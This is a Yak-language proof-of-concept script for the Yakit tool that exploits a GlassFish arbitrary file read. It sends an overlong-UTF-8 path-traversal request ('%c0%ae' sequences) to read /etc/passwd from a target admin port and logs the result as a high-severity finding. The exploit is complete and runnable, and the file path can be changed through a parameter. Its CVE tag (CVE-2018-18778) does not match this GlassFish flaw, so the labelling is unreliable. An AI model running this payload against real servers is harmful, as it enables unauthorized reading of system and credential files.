# Input your code!
log.setLevel("info")  // 设置日志级别
yakit.AutoInitYakit()   // 前台输出必写
isHttps = cli.Have("https", cli.setDefault(false))
target = cli.String("target", cli.setDefault("192.168.85.131:4848"))
cmd = cli.String("cmd", cli.setDefault("/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd"))


packet = `GET {{params(cmd)}} HTTP/1.1
HOST: {{params(target)}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: identity
Accept-Language: zh-CN,zh;q=0.9
Cache-Control: max-age=0
Cookie: JSESSIONID=bbdd38a8b05975636060cafe54d6
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Upgrade-Insecure-Requests: 1
sec-ch-ua: "Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
`
debug = cli.Have("debug", cli.setDefault(true))
if debug {
    loglevel("debug")
}
sendPacket = func(target) {
    return poc.HTTP (
        packet, 
        poc.timeout(10),
        # poc.proxy("http://127.0.0.1:8888"),
        # poc.proxy("http://127.0.0.1:7890"),
        poc.redirectTimes(3),  # 重定向次数
        poc.https(isHttps),
        poc.params({
            "target": target,
            "cmd":cmd,
        }),
       // poc.proxy("http://127.0.0.1:8083"),
     )
}

if YAK_MAIN {

    rspBytes, reqBytes, err = sendPacket(target)
    if err != nil{
        log.error("send packet error: %s", err)
        return  
    }
    if debug {
        println(string(reqBytes))
        println("---------------------------------")
        println(string(rspBytes))
        println("6")
    }
    println(string(rspBytes))
    if str.MatchAllOfSubString(rspBytes, "root") && str.MatchAllOfRegexp(rspBytes, `200`)   {
        yakit.Info(string(rspBytes))
        risk.NewRisk(
        target, risk.severity("high"), risk.type("CVE-2018-18778"),
        risk.title("English Title"),            ## English Title for Risk
        risk.titleVerbose("GlassFish任意文件读取漏洞"),           ##  中文标题
        risk.details({
            "target": string(target),
            "request":  string(reqBytes),
            "response":  string(rspBytes),
            }),
            )
        }else{
           yakit.Info("失败")
        } 
}
